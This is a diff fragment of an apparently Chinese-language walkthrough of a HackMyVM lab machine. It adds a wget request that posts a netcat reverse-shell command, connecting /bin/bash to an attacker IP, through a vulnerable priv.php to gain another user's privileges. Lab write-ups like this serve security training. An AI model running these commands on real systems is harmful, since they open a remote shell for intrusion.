@@ -199,6 +199,7 @@ cat priv.php
 wget --post-data='{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php
 
 #获取到drito用户的权限
+wget --post-data='{"command":"nc -c /bin/bash 192.168.6.149 8888"}' http://127.0.0.1:8000/priv.php
 ```
 
 ![image-20240620172602324](hmv.arroutada.assets/image-20240620172602324.png)
